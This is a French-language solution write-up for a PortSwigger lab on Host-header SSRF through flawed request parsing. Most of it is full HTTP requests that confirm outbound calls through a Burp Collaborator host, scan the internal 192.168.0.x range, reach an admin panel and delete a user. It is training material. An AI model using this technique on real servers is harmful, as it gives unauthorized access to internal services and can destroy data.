# Lab

https://portswigger.net/web-security/host-header/exploiting/lab-host-header-ssrf-via-flawed-request-parsing

## Solution

Si on change le header `Host` on a une erreur.

```http
HTTP/2 403 Forbidden
Content-Type: text/html; charset=utf-8
Content-Length: 109

<html><head><title>Client Error: Forbidden</title></head><body><h1>Client Error: Forbidden</h1></body></html>
```

On peut essayer des contournements comme envoyer l'host dans le GET directement.

```http
GET https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/ HTTP/2
Host: 0ae60064035fc21e80dc807000b30058.web-security-academy.net
Cookie: session=H9Q1NaJFF4OJTPajUDOpE9daZq3rW00A; _lab=46%7cMCwCFC6WD8xeSbgbnDRp7iIdz9KGPM4FAhQqI%2bYKOOx%2bsTPCm%2bzz2GuQREPXyD5qMvZ8oRjA4NQWnBRuYnT8Q7%2bbFUKaEftsJL%2fb%2baWhiBDJmHwP0kckqoNFkjomoYy9%2bgOJ0Q61TcnL3YW3Xl0OUWHaWq4Ed1PrppHI2Ku%2fgvuMnR8%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

La requête est acceptée, si on change le header `Host` on a une erreur de timeout.

```http
GET https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/ HTTP/2
Host: toto
Cookie: session=H9Q1NaJFF4OJTPajUDOpE9daZq3rW00A; _lab=46%7cMCwCFC6WD8xeSbgbnDRp7iIdz9KGPM4FAhQqI%2bYKOOx%2bsTPCm%2bzz2GuQREPXyD5qMvZ8oRjA4NQWnBRuYnT8Q7%2bbFUKaEftsJL%2fb%2baWhiBDJmHwP0kckqoNFkjomoYy9%2bgOJ0Q61TcnL3YW3Xl0OUWHaWq4Ed1PrppHI2Ku%2fgvuMnR8%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

```http
HTTP/2 504 Gateway Timeout
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 144

<html><head><title>Server Error: Gateway Timeout</title></head><body><h1>Server Error: Gateway Timeout (3) connecting to toto</h1></body></html>
```

On peut essayer de renseigner une URL de Burp Collaborator dans le header `Host`.

```http
GET https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/ HTTP/2
Host: 503j66xci8qe4j9perlt9qk3full9cx1.oastify.com
Cookie: session=H9Q1NaJFF4OJTPajUDOpE9daZq3rW00A; _lab=46%7cMCwCFC6WD8xeSbgbnDRp7iIdz9KGPM4FAhQqI%2bYKOOx%2bsTPCm%2bzz2GuQREPXyD5qMvZ8oRjA4NQWnBRuYnT8Q7%2bbFUKaEftsJL%2fb%2baWhiBDJmHwP0kckqoNFkjomoYy9%2bgOJ0Q61TcnL3YW3Xl0OUWHaWq4Ed1PrppHI2Ku%2fgvuMnR8%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

Et on voit qu'on reçoit des requêtes de la part du serveur.

Ca veut dire que le serveur fait des requêtes à l'URL qu'on lui a donné, ce qui nous permet de scanner le réseau interne avec Burp Intruder.

```http
GET https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/ HTTP/2
Host: 192.168.0.§1§
Cookie: session=H9Q1NaJFF4OJTPajUDOpE9daZq3rW00A; _lab=46%7cMCwCFC6WD8xeSbgbnDRp7iIdz9KGPM4FAhQqI%2bYKOOx%2bsTPCm%2bzz2GuQREPXyD5qMvZ8oRjA4NQWnBRuYnT8Q7%2bbFUKaEftsJL%2fb%2baWhiBDJmHwP0kckqoNFkjomoYy9%2bgOJ0Q61TcnL3YW3Xl0OUWHaWq4Ed1PrppHI2Ku%2fgvuMnR8%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

On créé une liste de sous-réseaux à scanner de 0 à 255 qui remplacera le `§1§` dans la requête.

Il ne faut pas oublier de décocher le `Update Host header to match target` dans les options de la requête.

Avec ça, on trouve que l'adresse `192.168.0.2` répond avec une redirection vers `/admin`.

```http
HTTP/2 302 Found
Location: /admin
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

On a plus qu'à ajouter `/admin` à la fin de l'URL pour accéder à la page.

```http
GET https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/admin HTTP/2
Host: 192.168.0.2
Cookie: session=H9Q1NaJFF4OJTPajUDOpE9daZq3rW00A; _lab=46%7cMCwCFC6WD8xeSbgbnDRp7iIdz9KGPM4FAhQqI%2bYKOOx%2bsTPCm%2bzz2GuQREPXyD5qMvZ8oRjA4NQWnBRuYnT8Q7%2bbFUKaEftsJL%2fb%2baWhiBDJmHwP0kckqoNFkjomoYy9%2bgOJ0Q61TcnL3YW3Xl0OUWHaWq4Ed1PrppHI2Ku%2fgvuMnR8%3d
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```

Ensuite on utilise le même prinicpe pour supprimer l'utilisateur `carlos`.

```http
POST https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/admin/delete HTTP/2
Host: 192.168.0.2
Cookie: session=H9Q1NaJFF4OJTPajUDOpE9daZq3rW00A; _lab=46%7cMCwCFC6WD8xeSbgbnDRp7iIdz9KGPM4FAhQqI%2bYKOOx%2bsTPCm%2bzz2GuQREPXyD5qMvZ8oRjA4NQWnBRuYnT8Q7%2bbFUKaEftsJL%2fb%2baWhiBDJmHwP0kckqoNFkjomoYy9%2bgOJ0Q61TcnL3YW3Xl0OUWHaWq4Ed1PrppHI2Ku%2fgvuMnR8%3d
Content-Length: 53
Cache-Control: max-age=0
Origin: https://0ae60064035fc21e80dc807000b30058.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: https://0ae60064035fc21e80dc807000b30058.web-security-academy.net/admin
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

csrf=XvSUyiNBdQiMl79bMBnx4wHX3mHfDdeD&username=carlos
```